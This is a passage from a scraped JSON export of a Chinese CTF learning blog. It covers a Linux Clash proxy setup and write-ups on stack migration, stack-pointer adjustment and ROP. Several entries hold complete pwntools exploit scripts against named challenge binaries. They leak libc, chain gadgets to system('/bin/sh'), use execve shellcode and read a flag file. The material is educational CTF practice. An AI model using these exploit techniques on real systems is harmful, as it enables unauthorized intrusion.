还有在比赛过程中，如果一个题目不好获取到libc，那么可以看看其他题目的libc，有可能这个赛事平台服务器都是这个版本。","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"学习记录","slug":"学习记录","permalink":"http://chumen77.xyz/tags/学习记录/"}]},{"title":"linux下clash的使用","slug":"linux下clash的使用","date":"2020-02-14T15:27:09.000Z","updated":"2020-02-28T07:49:58.000Z","comments":true,"path":"2020/02/14/linux下clash的使用/","link":"","permalink":"http://chumen77.xyz/2020/02/14/linux下clash的使用/","excerpt":"","text":"linux下clash的使用前言本文只是很简单记录一下，自己如何使用clash的。因为发现终端虽说在本机上已经开了代理，但是终端执行命令下载东西的时候十分的卡，今天才了解到，原来终端的代理是另外开的。所以就开始折腾一下，linux下clash的使用（本人用了很久了clash，所以直接看这个软件了）。 0x01执行cd &amp;&amp; mkdir clash 在用户目录下创建 clash 文件夹。下载适合的 Clash 二进制文件并解压重命名为 clash,一般个人的64位电脑下载 clash-linux-amd64.tar.gz 即可。地址：https://github.com/Dreamacro/clash/releases 0x02在终端cd到Clash二进制文件所在的目录,把Clash 配置文件给移进去。配置文件的名称要是config.yaml 我是直接创建了这个文件，并写入的自己的配置，因为mac本机一直用这个软件，然后在配置文件找到主使用那个，直接复制那个自己使用代理网站加载下来的配置给config.yaml。 0x03chmod +x ./clash加执行权限执行 ./clash -d . 即可启动 Clash，同时启动 HTTP 代理和 Socks5 代理。然后进入这个http://clash.razord.top/ 链接可以对代理进行个简单管理 0x04打开系统设置，选择网络，点击网络代理右边的 ⚙ 按钮，选择手动，填写 HTTP 和 HTTPS 代理为 127.0.0.1:7890，填写 Socks 主机为 127.0.0.1:7891，即可启用系统代理。 0x05终端开启代理export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7891执行这个命令即可。出现这个就是代理成功了，然后就会发现终端下载东西的神速。","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://chumen77.xyz/tags/linux/"}]},{"title":"Stack Migration题目练习","slug":"Stack Migration题目练习","date":"2020-02-11T13:51:48.000Z","updated":"2020-02-28T07:51:31.000Z","comments":true,"path":"2020/02/11/Stack Migration题目练习/","link":"","permalink":"http://chumen77.xyz/2020/02/11/Stack Migration题目练习/","excerpt":"","text":"Stack Migration题目练习前言记录几道Stack Migration的练习题。 pwnable_simple_login查看保护和archArch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 32位程序，开了nx和Canary保护。 ida分析int __cdecl main(int argc, const char **argv, const char **envp) &#123; int de_s; // [esp+18h] [ebp-28h] char s; // [esp+1Eh] [ebp-22h] unsigned int de_length; // [esp+3Ch] [ebp-4h] memset(&amp;s, 0, 0x1Eu); setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); printf(\"Authenticate : \"); _isoc99_scanf(\"%30s\", &amp;s); memset(&amp;input, 0, 0xCu); de_s = 0; de_length = Base64Decode((int)&amp;s, &amp;de_s); // v6 = 解码后的长度 if ( de_length &gt; 0xC ) &#123; puts(\"Wrong Length\"); &#125; else &#123; memcpy(&amp;input, de_s, de_length); // 执行完，把解码后的字段，放入input的bss内存上 if ( auth(de_length) == 1 ) correct(); &#125; return 0; &#125; （其中已经改了部分变量的名称方便读代码）流程就是接受一段base64编码过的字符串，然后进行一下解码，解码返回长度给变量，且做与12大小的比较，如果解码后大于12，就直接退出程序，并且解码的字符串是放在input的这个全局变量里：接着进入auth函数分析一下： _BOOL4 __cdecl auth(int length) &#123; char v2; // [esp+14h] [ebp-14h] char *s2; // [esp+1Ch] [ebp-Ch] int v4; // [esp+20h] [ebp-8h] memcpy(&amp;v4, &amp;input, length); s2 = (char *)calc_md5((int)&amp;v2, 12); printf(\"hash : %s\\n\", s2); return strcmp(\"f87cd601aa7fedca99018a8be88eda34\", s2) == 0; &#125; 可以发现其是一个md5加密后，然后跟后面那串字符串对比。并且看一下v4变量：发现memcpy这个函数会引起栈溢出，但是可控的只是12-8 = 4字节。然后输入12位‘1’，编码后放入程序，发现最后的4个字节被放入了ebp，正好这下就可以控制ebp了。接着就有了攻击思路： 攻击思路控制好这个ebp，然后由于这个程序中，auth函数最后有一个leave ret 的gadget，main函数也有一个，正好满足我们来Stack Migration。在栈上摆放的结构为：到时候由于memcpy会复制这个老栈的前12个字节的数据，然后new esp指向的是固定位置input。然后两个leave gadget即可 EXPfrom pwn import * from base64 import * # io = process('./login') io = remote('node3.buuoj.cn',29026) system_add = 0x08049284 buf = 0x0811EB40 io.recvuntil('e : ') p = 'aaaa' + p32(system_add) + p32(buf) io.sendline(b64encode(p)) io.interactive() 安恒月赛_over.over查保护和arch[*] '/media/psf/mypwn2/ichunqiu/stack_pivot/ah_over/over.over' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 64位，只开了nx ida分析__int64 __fastcall main(__int64 a1, char **a2, char **a3) &#123; setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); while ( sub_400676() ) ; return 0LL; &#125; 主函数十分简单，主要核心就在while包裹的函数: int sub_400676() &#123; char buf; // [rsp+0h] [rbp-50h] memset(&amp;buf, 0, 0x50uLL); putchar('&gt;'); read(0, &amp;buf, 0x60uLL); return puts(&amp;buf); &#125; 可以看到溢出可控自己只有8个字节，也就是一个gadget，明显需要Stack Migration，那么就得控制好ebp，padding即为0x50，但是这个题目没有给我们固定的地址，也就是没有全局变量可用，那就想办法看栈偏移了。 可以看到是read函数，和puts函数的搭配，当往里面塞0x50字节字符是不会添加上’\\x00’的: 然后用puts函数输出时会把ebp里面的值也会输出出来。这下栈偏移是固定的，就可以在read的时候往里面塞rop链，依靠偏移来跳上去执行就可以了。算一下main的ebp与现在的esp差距是112个字节。让ebp-112就等于esp指向了栈顶esp。 攻击思路先给程序0x50个字节，然后接收下main的ebp值。然后程序由于while循环再次，进入这个函数，这时候送rop链，第一个rop链可以先泄露下puts的内存地址，然后计算libc的地址，返回地址写成主函数start，清理下栈。然后第二次读的时候，送过去system(/bin/sh)的rop链即可。程序每次读，构造好rop链的时候，要保证送过去80字节，然后控制ebp 为栈顶esp，还有加上leave 的gadget，这下两个leave的gadget就让程序跳回栈头的下个8个字节，开始执行rop链。 expfrom pwn import * context.log_level = 'debug' context.arch = 'amd64' io = process('./over.over') e = ELF('./over.over') l = ELF('/lib/x86_64-linux-gnu/libc-2.23.so') leave_ret = 0x004006be pop_rdi_ret = 0x0400793 put_got = e.got['puts'] put_plt = e.symbols['puts'] padding = 80 raw_input('-&gt;') io.sendafter(\"&gt;\", 'a' * 80) # stack = u64(io.recvuntil(\"\\x7f\")[-6: ].ljust(8, '\\0')) - 0x70 stack = u64((io.recvline())[80:86].ljust(8,'\\x00')) - 0x70 io.readuntil('&gt;') print(hex(stack)) p = flat(['11111111',pop_rdi_ret,put_got,put_plt,0x000400580,(80-40)*'1',stack,leave_ret]) raw_input('-&gt;') io.send(p) libc = u64(io.recvuntil(\"\\x7f\")[-6: ].ljust(8, '\\0')) - l.symbols['puts'] print(hex(libc)) io.sendafter(\"&gt;\", 'a' * 80) stack = u64((io.recvline())[80:86].ljust(8,'\\x00')) - 0x70 print(hex(stack)) io.readuntil('&gt;') system_add = libc + l.symbols['system'] binsh_add = libc + l.search('/bin/sh\\x00').next() p = flat(['22222222',pop_rdi_ret,binsh_add,system_add,(80-4*8)*'2',stack,leave_ret]) io.send(p) io.interactive() HITCON_training_lab6源码#include &lt;stdio.h&gt; int count = 1337 ; char *t= \"Z\\xc3\" ; int main()&#123; if( count!=1337 )&#123; _exit(1); &#125; count++ ; char buf[48]; setvbuf(stdout,0,2,0); puts(\"Try your best : \" ); read(0, buf,128); return ; &#125; gcc -m32 -z relro -z now -fno-stack-protector -mpreferred-stack-boundary=2 migration.c -o migration 编译命令。然后就不分析了，前面练习64位时候写的那个博客已经记录很清楚了，这里只记录下exp。 expfrom pwn import * context.arch = 'i386' context.log_level = 'debug' # io = process('./migration') io = remote('127.0.0.1',4000) e = ELF('./migration') l = ELF('/lib/i386-linux-gnu/libc-2.23.so') padding = 40 puts_plt = e.symbols['puts'] puts_got = e.got['puts'] read = e.symbols['read'] leave_ret = 0x08048418 buf1 = 0x0804b000 - 0x100 buf2 = buf1 - 0x50 pop_edx_ret = 0x0804836d p = 'a' * padding + flat([buf1,read,leave_ret,0,buf1,0x50]) io.readuntil(':\\n') io.send(p) p = flat([buf2,puts_plt,pop_edx_ret,puts_got,read,leave_ret,0,buf2,0x50]) sleep(0.1) raw_input('-&gt;') io.sendline(p) puts_add = u32(io.recv(4)) libc = puts_add - l.symbols['puts'] print(hex(libc)) system_add = l.symbols['system'] + libc binsh_add = l.search('/bin/sh\\x00').next() + libc p = flat([buf1,system_add,system_add,binsh_add]) raw_input('-&gt;') # sleep(0.1) io.sendline(p) io.interactive() spwn查保护和archArch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 尝试运行 ida分析直接看漏洞函数 ssize_t vul_function() &#123; size_t v0; // eax size_t v1; // eax char buf; // [esp+0h] [ebp-18h] v0 = strlen(m1); write(1, m1, v0); // Hello good Ctfer read(0, &amp;s, 0x200u); v1 = strlen(m2); write(1, m2, v1); // What do you want to say? return read(0, &amp;buf, 0x20u); &#125; 发现可以利用的gadget只有一个，那就只有leave的gadget了，然后把ebp控制到前面的read函数的s处，其也是全局变量，地址固定。 攻击思路 在第一个read的时候，直接把构造的rop链读进去。任务分别是leak 一个函数的内存地址，来用libcseacher算出system，跟/bin/sh字符串的地址，返回start函数清理栈开启第二次使用漏洞； call system（/bin/sh） 然后第二个read时候，把控ebp指向固定地址s的地址，retaddress 放上leave的gadget。 expfrom pwn import * context.arch = 'i386' context.log_level = 'debug' from LibcSearcher import * e = ELF('./spwn') io = process('./spwn') # libc = e.libc io = remote('node3.buuoj.cn',28527) padding = 24 s = 0x0804A300 fake1 = 0x0804A500 leave_ret = 0x08048511 puts_add = e.symbols['puts'] write_plt = e.symbols['write'] write_got = e.got['write'] io.recvuntil('name?') p = flat([fake1,write_plt,0x080483A0,1,write_got,10]) io.send(p) io.recvuntil('say?') p = padding * 'a' + p32(s) + p32(leave_ret) # raw_input('-&gt;') io.send(p) write_add = u32(io.recv(4)) print(hex(write_add)) obj = LibcSearcher('write',write_add) libc_base = write_add - obj.dump('write') #libc.symbols['write'] print(hex(obj.dump('write'))) print(hex(libc_base)) sys_add = libc_base + obj.dump('system') #libc.symbols['system'] binsh_add =libc_base + obj.dump('str_bin_sh') #libc.search('/bin/sh\\x00').next() io.recvuntil('name?') p = flat([fake1,sys_add,0x080483A0,binsh_add]) io.send(p) io.recvuntil('say?') p = padding * 'a' + p32(s) + p32(leave_ret) io.send(p) io.interactive() ACTF_ 2019_hardcore fmt查保护和arch[*] '/media/psf/mypwn2/buuctf/actf_2019_babystack/ACTF_2019_babystack' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ida分析￼￼￼￼其中可以看到后面的read处，存在一个栈溢出，但是只有一个gadget可以用，需要考虑Stack Migration。其中那个sub400a1a函数是问你需要留下多少的字节，肯定要0xe0，所以再送过去的时候就填入0xe0，正好做参数给下面read函数用。 然后程序接受到0xe0后，进入if语句中，会输出一下堆栈esp的值，这下也是相当于知道了一个特定的地址，然后就正常构造rop链，把控ebp等于为接收到的stack esp，再跟上leava gadget即可。 expfrom pwn import * from LibcSearcher import * context.log_level = 'debug' context.arch = 'amd64' # io = process('./ACTF_2019_babystack') # io = remote('node3.buuoj.cn',27626) io = remote('challenge-848a378609341016.sandbox.ctfhub.com', 24656) elf = ELF('./ACTF_2019_babystack') # libc = elf.libc io.recvuntil('message?\\n') io.sendline('224') io.recvuntil('saved at') stack_addr = int((io.recvline_contains('0x7f')),16) print(stack_addr) libc_start_main_got = elf.got['__libc_start_main'] puts_plt = elf.symbols['puts'] pop_rdi_ret = 0x000400ad3 start_addr = 0x000400800 leave_ret = 0x400a18 payload = flat(['\\x00'*8,pop_rdi_ret,libc_start_main_got,puts_plt,start_addr]) payload = payload.ljust(208,'a') payload += flat([stack_addr,leave_ret]) io.recvuntil('&gt;') raw_input('-&gt;') io.send(payload) io.recvuntil('bye~\\n') libc_start_main_addr = u64(io.recv(6).ljust(8,'\\x00')) #- libc.symbols['__libc_start_main'] obj = LibcSearcher('__libc_start_main',libc_start_main_addr) libc_base = libc_start_main_addr - obj.dump('__libc_start_main') print(hex(libc_base)) io.recvuntil('message?\\n') io.sendline('224') io.recvuntil('saved at') stack_addr = int((io.recvline_contains('0x7f')),16) print(stack_addr) rec = libc_base + 0x4f2c5 payload = flat(['\\x00'*8,rec]) payload = payload.ljust(208,'\\x00') payload += flat([stack_addr,leave_ret]) io.recvuntil('&gt;') raw_input('-&gt;') io.send(payload) io.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"Stack Migration","slug":"Stack-Migration","permalink":"http://chumen77.xyz/tags/Stack-Migration/"}]},{"title":"花式栈溢出（栈帧的调节）","slug":"花式栈溢出（调节栈帧）","date":"2020-02-05T08:53:11.000Z","updated":"2020-03-12T15:14:16.000Z","comments":true,"path":"2020/02/05/花式栈溢出（调节栈帧）/","link":"","permalink":"http://chumen77.xyz/2020/02/05/花式栈溢出（调节栈帧）/","excerpt":"","text":"花式栈溢出（栈帧的调节）前言本人刚学pwn不久，最近在学习过程中学到了各种需要栈帧调节的题目，以此记录一下。在一些栈溢出的程序中，我们会碰到一些问题，例如溢出的可控字节数太少，无法构造我们想要的rop链，程序ASLR开启后导致的栈地址不可预测等。对于这种问题，常用的思路包括： 加减esp值，控制栈指针 Stack Migration来构造一个假的栈帧。 这里总结了2种题型： 加减esp，把控栈指针这种题型就需要用Ropgadget找一个控制esp的gadget，然后简单修改esp值的大小，来满足我们的需求。 Alictf_016_vss这个题目就是一个修改esp扩大栈空间，从而构造rop链获取shell的题目。 检查保护和arch ida分析由于这个程序使用静态编译和strip命令剥离符号，用ida打开没有我们平时看的那么简单，很多函数已经无法识别，我们就需要自己调试，然后推测是什么函数。start函数中，call的函数是__libc_start_main, 上一行的 offset则是main函数那个箭头就是main函数了。进入main函数以后，可以经过syscall中rax的参数来确认其是什么函数，很明显一个函数是alarm函数，先手动nop一下。把这个函数去除后，方便gdb的后期调试。接着可以很容易确定一下puts函数跟read函数，在ida中修改一下。下面那个40108e函数是比较复杂的，我用edb动态调试来确定出其中的某些函数：对于这个函数，先确定一下其参数。dump过去就会发现是复制了一份。所以就确定这个函数是strncpy是函数。对于这个函数char *strncpy(char *dest, const char *src, int n)将src指向的字符数组中n个字符复制到dest指向的字符数组中，在第一个空字符处停止，并返回被复制后的dest。对于下一段就是判断一下，是否与0x79和0x70相等，可以来手动修改值让其相等。往后走会发现先溢出了，在做溢出题的时候看到return 就应该想办法想上跳。溢出的这个地址就是刚刚又syrcpy函数复制过来0x50字节中的最后8个字节，因为是strncpy函数，我们输入的字符串中是不能有\\x00，否则会被截断，从而无法复制满0x50字节制造可控溢出，所以前0x48个字节中，我们不能写入任何地址。在这种情况下就需要通过修改esp来完成漏洞利用。 在最前面的read函数中，给了十分大的缓冲区可以用，我们可以把ROP链放在0x50字节之后，然后通过增加esp的值把栈顶抬到ROP链上，紧接着执行这个rop链即可。 查到one_gadget发现0x000000000046f205 : add rsp, 0x58 ; ret正好符合要求。然后gdb调试一下确定一下rop链从50个字节后的那里开始合适即可。（这个在找onegadget的时候注意不要把rsp搞成esp了，自己在做的时候因为这个调试了半天，才发现是这个错误，导致exp不成功） expfrom pwn import * import time io = process(&apos;./vss&apos;) e = ELF(&apos;./vss&apos;) io.recvuntil(&apos;Password:\\n&apos;) add_rsp_0x58_ret = 0x0046f205 pop_rax_ret = 0x0046f208 pop_rdi_ret = 0x0401823 pop_rsi_ret = 0x0401937 pop_rdx_ret = 0x043ae05 bss = 0x6C8178 -10 syscall_ret = 0x0045f2a5 rop1 = [ pop_rax_ret, 0, pop_rdi_ret, 0, pop_rsi_ret, bss, pop_rdx_ret, 10, syscall_ret, pop_rax_ret, 0x3b, pop_rdi_ret, bss, pop_rsi_ret, 0, pop_rdx_ret, 0, syscall_ret ] # raw_input(&apos;-&gt;&apos;) io.sendline(&apos;py&apos; + &apos;a&apos;*70 + p64(add_rsp_0x58_ret)+ &apos;b&apos;* 8 + &apos;&apos;.join(map(p64,rop1))) # raw_input(&apos;-&gt;&apos;) sleep(0.1) io.send(&apos;/bin/sh\\x00&apos;) io.interactive()X-CTF Quals 2016-b0verfl0w查保护和arch这个nx也没有开，可以用栈执行shellcode ida分析signed int vul() { char s; // [esp+18h] [ebp-20h] puts(&quot;\\n======================&quot;); puts(&quot;\\nWelcome to X-CTF 2016!&quot;); puts(&quot;\\n======================&quot;); puts(&quot;What&apos;s your name?&quot;); fflush(stdout); fgets(&amp;s, 50, stdin); printf(&quot;Hello %s.&quot;, &amp;s); fflush(stdout); return 1; }代码很简单，但是可以发现可以溢出的字节只有50-0x20-4=14个字节可控，所以是很难写出rop链来获取咱们目的的。然后就可以考虑控制栈指针的攻击思路，就是先把shellcode摆在栈上，然后控制eip到达这里就可以了。但是由于程序本身会开启 ASLR 保护，所以我们很难直接知道 shellcode 的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对 esp 进行操作，使其指向 shellcode 处，并且直接控制程序跳转至 esp 处。 找一下控制esp的gadget 0x08048504 : jmp esp然后怎么控制eip到shellcode上呢，因为没有nx保护，我们可以写一段指令来控制偏移： sub esp,0x28 jmp espexpfrom pwn import * #io = process(&apos;./b0verfl0w&apos;) context.arch = &apos;i386&apos; io = remote(&apos;node3.buuoj.cn&apos;,29410) shellcode = &quot;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73&quot; shellcode += &quot;\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0&quot; shellcode += &quot;\\x0b\\xcd\\x80&quot; sub_esp_jmp = asm(&apos;sub esp, 0x28;jmp esp&apos;) jmp_esp = 0x08048504 payload = shellcode + (36-len(shellcode_x86))*&apos;b&apos;+p32(jmp_esp) + sub_esp_jmp io.readuntil(&apos;?\\n&apos;) #raw_input(&apos;-&gt;&apos;) io.sendline(payload) io.interactive()Stack Migration在 Stack Migration 中，我们所利用的技巧便是同时控制 EBP 与 EIP，这样我们在控制程序执行流的同时，也改变程序栈帧的位置。 原理我们知道在函数建立栈帧时有两条指令push ebp; mov ebp, esp，而退出时同样需要消除这两条指令的影响，即leave(mov esp, ebp; pop ebp) 。且leave一般紧跟着就是ret。因此，在存在栈溢出的程序中，只要我们能控制到栈中的ebp，我们就可以通过两次leave劫持栈。 第一次随着程序流leave; ret，new esp为我们构造新栈的目标地址。 可以看到执行到ret时，esp还在原来的old栈上，而ebp已经指向了新的栈的栈顶。第二次进入我们放入栈上的leave; ret 的gadget（这个是我们事先写上栈的）esp已经被成功劫持到新的栈上，执行完gadget后栈顶会 在new_esp-4(64位是-8)的位置上。此时栈完全可控了，通过预先或者之后在new stack上布置的rop链可以轻松完成攻击。 HITCON_training_lab6_64位这个是在HITCON_training的一个练习，直接给的有源码，我给编译成了64位版本。 源码#include &lt;stdio.h&gt; int count = 1337 ; char *t= &quot;Z\\xc3&quot; ; int main(){ if( count!=1337 ){ _exit(1); } count++ ; char buf[48]; setvbuf(stdout,0,2,0); puts(&quot;Try your best : &quot; ); read(0, buf,128); return ; }gcc -z relro -z now -fno-stack-protector -mpreferred-stack-boundary=2 migration.c -o migration 编译命令 简单分析这个题纯粹就是为了练习的Stack Migration用的，可以不分析代码直接用gdb-peda直接来测试：熟悉的栈溢出，但是下面多出来的一些字符串，也是程序不能接受的部分，也可以作为一个需要考虑栈迁移的标志。注意一下rsp被覆盖的值。计算padding为48.计算一下，可以填入多少的可控字段。去除一下刚刚程序不能存入的部分和padding部分，还有80个字节可以用。其中一个来伪造new esp，剩下也就还有9个gadget可以用，可以给我构造第一个rop链。 图解分析假设我们已经填入了溢出字符，buf1即为我们要去的新栈，这个选择bss段的后一半：开始执行一下leave 中的mov rsp,rbp：此时rsp 也指向了 rbp指向的位置，在执行leave中的pop rbp:此时rbp已经到了我们伪造的新栈buf1，然后开始执行ret,进入执行pop_rdi的gadget: 此时已经将buf1的地址，推入rdi，作为gets的参数，执行gets函数后，我们就可以往buf1上填入我们的rop链，此时栈大小已经没有限制了，可以任意写。在这个buf1的栈空间里，我们需要先把rbp指向的位置写入buf2（下一个构造的新栈），然后构造rop链把puts的内存地址给泄露出来，进而可以算出libc的基地址，接着再构造一个gets函数。接着是执行一下leave 的gadget：执行完以后就可以发现我们，已经完全控制了栈。并且开了一个buf2的新栈，留着在buf1调用gets函数时来在buf2新栈中摆上调用system(/bin/sh)函数的rop链。然后继续执行：这就泄露出了puts函数的内存地址。接着开始往buf2新栈上读rop链:读入完成，接着再次执行leave的gadget：可以看到esp到了新栈，rbp因为刚刚在buf2填入的buf1，又会到了buf1，这个地址可以随便填了，对做题不影响，填写这个只是可以看到再次栈转移。接着执行buf2新栈的rop链：就可以拿到shell了。 EXP借着这个思路就可以开始写exp: from pwn import * import time context.arch = &apos;amd64&apos; context.log_level = &apos;debug&apos; e = ELF(&apos;./test&apos;) l = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;) # io = remote(&apos;127.0.0.1&apos;,4000) io = process(&apos;./test&apos;) pop_rdi_ret = 0x400703 pop_rsi_r15_ret= 0x0400701 pop_rdx_ret= 0x0400724 leave_ret= 0x0400699 buf1 = 0x00602000 - 0x200 buf2 = buf1 + 0x100 padding = 56 - 8 puts_plt = e.symbols[&apos;puts&apos;] puts_got = e.got[&apos;puts&apos;] read_add = e.symbols[&apos;read&apos;] io.recvuntil(&apos;:&apos;) p = &apos;a&apos;*padding + flat([buf1,pop_rdi_ret,0,pop_rsi_r15_ret,buf1,0,pop_rdx_ret,0x100,read_add,leave_ret]) #raw_input(&apos;-&gt;&apos;) io.send(p) sleep(0.1) p = flat([buf2,pop_rdi_ret,puts_got,puts_plt,pop_rdi_ret,0,pop_rsi_r15_ret,buf2,0,pop_rdx_ret,0x100,read_add,leave_ret]) sleep(0.1) #raw_input(&apos;-&gt;&apos;) io.sendline(p) io.recvuntil(&apos;\\n&apos;) puts = u64((io.recv(6)).ljust(8,&apos;\\x00&apos;)) libc = puts - l.symbols[&apos;puts&apos;] print(&apos;libc_base:&apos; + hex(libc)) binsh_add = l.search(&apos;/bin/sh\\x00&apos;).next() + libc #print(binsh_add) # raw_input(&apos;-&gt;&apos;) system_add = l.symbols[&apos;system&apos;] + libc p = flat([buf1,pop_rdi_ret,binsh_add,system_add]) sleep(0.1) io.sendline(p) io.interactive()Hgame2020_week2_rop_level2查保护和arch32位程序，开了nx保护 ida分析这个明显的栈溢出，但是0x60-0x50-0x8 = 8。发现只有一个gadget位置，无法构造我们想要的rop链。但是前面的第一个read函数，可以读入很大空间，并且第二个参数buf的地址是固定的。那这个题明显就是可以Stack Migration来解决问题了，并且只需再写一个leave ret就控制栈了。 攻击思路程序中有着open，read，puts函数，我们可以写一个rop链，调用open函数，控制其参数是./flag，并在gdb中调试将其返回的文件fd号记录下来，然后传递给read函数，让其读入文件内容存入某个缓冲区，再用puts函数输出一下flag文件的内容即可。在第一个read的时候，我们就需要写好rop链。然后在最后一个read函数时，控制好ebp指向我们的新栈。 EXPfrom pwn import * context.log_level = &apos;debug&apos; context.arch = &apos;amd64&apos; # io = process(&apos;./ROP&apos;) io = remote(&apos;47.103.214.163&apos;,20300) e = ELF(&apos;./ROP&apos;) buf = 0x06010A0 # libc = e.libc padding = 80 leave_ret = 0x040090d pop_rdi_ret = 0x00400a43 pop_rsi_r15 = 0x00400a41 open_plt = 0x4007b0 read_plt = 0x400780 puts_plt = 0x400760 io.recvuntil(&apos;think so?\\n&apos;) p = flat([&apos;./flag\\x00\\x00&apos;,pop_rdi_ret,buf,pop_rsi_r15,0,0,open_plt,pop_rdi_ret,4,pop_rsi_r15,buf+0x80,0,read_plt,pop_rdi_ret,buf+0x80,puts_plt]) io.sendline(p) io.recvuntil(&apos;\\n&apos;) p = padding * &apos;a&apos; + p64(buf) + p64(leave_ret) raw_input(&apos;-&gt;&apos;) #手动下一个断点，以后让gdb附加上进行调试 io.send(p) flag = io.recvline_contains(&apos;hgame&apos;) print(flag) io.interactive()我们跟着exp来调试一下，看看效果：此时的esp是我们伪造的new esp，已经指向了我们的目标位置，并且第一个rop链接已经送过去，可以看到./flag的字眼。执行一下leave：可以看到rbp的值已经等于我们伪造的值，esp还在原来栈上。接着执行ret，进入下一个leave ret：先记录下当前的状态，开始执行leave：执行完发现esp已经到达了新栈buf+8的位置，此时的栈帧已经是我们完全想要的，已经劫持了程序流程，并且新栈空间很大，可以满足我们的需求。ebp是多少已经不重要了，我们直接填入./flag，这个固定地址也做为给open函数做参数。在调试的时候，执行完open函数需要把返回的fd值记录下，给read函数做参数。最后由puts函数在输出flag： Stack Migration小总结 这下可以总结下利用思路也就是 把控好起初栈的ebp，在里面写入需要伪造的new esp 在之后的可利用字节中写入leave gadget 将想执行的ROP Chain写在已知固定位置上 再利用leave搬移Stack位置到已知位置 然后无限接ROP Chain","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"学习记录","slug":"学习记录","permalink":"http://chumen77.xyz/tags/学习记录/"},{"name":"Stack Migration","slug":"Stack-Migration","permalink":"http://chumen77.xyz/tags/Stack-Migration/"}]},{"title":"ROP题目练习","slug":"ROP练习","date":"2020-02-03T08:21:13.000Z","updated":"2020-06-22T03:57:18.281Z","comments":true,"path":"2020/02/03/ROP练习/","link":"","permalink":"http://chumen77.xyz/2020/02/03/ROP练习/","excerpt":"","text":"ROP题目练习前言最近在学习栈溢出，做了一些ROP的练习题，基本都是buuoj的题目，搜索rop字眼找的rop题。简单记录一下收获和exp。 有libc（或者无libc可做）OGeek2019_babyrop查保护和arch32位程序，开启NX堆栈不可执行。 ida分析可以看出其取了一个随机数，存入buf。然后进入这个函数分析，看到接收buf传来的值，放入s中。然后下面接收你传入的东西，与s判断是否相同，不相同就会退出。然后如果不退出返回值是v5，但是这里的v5在函数中是没有经过处理的。看一下汇编：v5咱们想控制，就只能通过原来那个read函数，咱们传入的值去控制。返回值给v2，然后v2作为参数然后进入下面这个带有溢出的函数中。 观察后，可以看出咱们应该把这个返回的参数整的大一点，方便进行写ROP链。 分析总结其中对于绕过相等判断，可以利用一下strlen函数的特性，然后直接用\\x00来截断。v5这个返回参数可以控制为’\\xff’,然后进入带有溢出的函数，写rop链就行了。先用puts函数泄露出__libc_start_main的地址，然后在给的libc中确认下symbols，然后拿到libc基址，然后直接利用one gadget RCE即可。 expfrom pwn import * import time # io = process('./pwn') io = remote('node3.buuoj.cn',27780) libc = ELF('./libc-2.23.so') # blibc = ELF('/lib/i386-linux-gnu/libc-2.23.so') elf = ELF('./pwn') # raw_input('-&gt;') p1 = '\\x00'.ljust(8,'\\xff') offset = 0xe7 + 4 io.send(p1 + '\\n') io.recvline_contains('Correct') start_add=0x080485A0 put_add = elf.symbols['puts'] libc_start_add = elf.got['__libc_start_main'] rop1 = [ put_add, start_add, libc_start_add ] p2 = offset * '\\x00' + ''.join(map(p32,rop1)) io.sendline(p2) sleep(1) libc_base = u32(io.recv(4)) - libc.symbols['__libc_start_main'] REC = libc_base+0x3a80c print('libc_base :'+hex(libc_base)) offset = 0xe7 + 4 io.send(p1 + '\\n') io.recvline_contains('Correct') p3 = offset * '\\x00' + p32(REC) io.sendline(p3) io.interactive() HarekazeCTF2019_baby_rop查保护和arch ida分析int __cdecl main(int argc, const char **argv, const char **envp) &#123; char v4; // [rsp+0h] [rbp-10h] system(\"echo -n \\\"What's your name? \\\"\"); __isoc99_scanf(\"%s\", &amp;v4); printf(\"Welcome to the Pwn World, %s!\\n\", &amp;v4); return 0; &#125; 程序十分简单，给了system函数，且明显存在溢出。ida查看字符串，该可以发现/bin/sh/，这构造个简单rop链直接利用就好了。 expfrom pwn import * import time # io = process('./babyrop') io = remote('node3.buuoj.cn',28633) elf = ELF('./babyrop') offset = 0x10 + 8 binsh_add = 0x0601048 pop_rdi_ret=0x000400683 system_add = elf.symbols['system'] # io.recvline_contains('your') # raw_input('-&gt;') p = 'a' * offset + p64(pop_rdi_ret) + p64(binsh_add) + p64(system_add) io.sendline(p) io.interactive() 拿到shell后，这个题buuctf根目录下没有flag文件。需要find / -name &quot;flag&quot; 可以查到是在/home/babyrop/flag这个目录下。 HarekazeCTF2019_baby_rop2查保护和arch ida分析函数过程很简单，明显栈溢出，思路就是先栈溢出构造rop链，让pintf函数打印出__libc_start_main函数在内存的地址，然后在给的libc文件中获取一下其sympol是的值，然后再计算出它的基址，再让函数返回到shart处清理一下栈，然后再次利用onegadget RCE构造相关rop链即可。 expfrom pwn import * import time io = process('./babyrop2') # blibc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so') # context.log_level = 'debug' libc = ELF('./libc.so.6') io = remote('node3.buuoj.cn',27694) elf = ELF('./babyrop2') offset = 40 __libc_start_add = elf.got['__libc_start_main'] start_add = 0x0400540 printf_add = elf.symbols['printf'] aWelcomeToThePw = 0x400770 pop_rdi_ret= 0x000400733 pop_rsi_r15_ret = 0x00400731 libc_start_sys = libc.symbols['__libc_start_main'] rop1 = [ pop_rdi_ret, aWelcomeToThePw, pop_rsi_r15_ret, __libc_start_add, 0, printf_add, start_add ] io.recvuntil('e? ') # io.recvuntil('again, ') # raw_input('-&gt;') p = 'a' * offset + 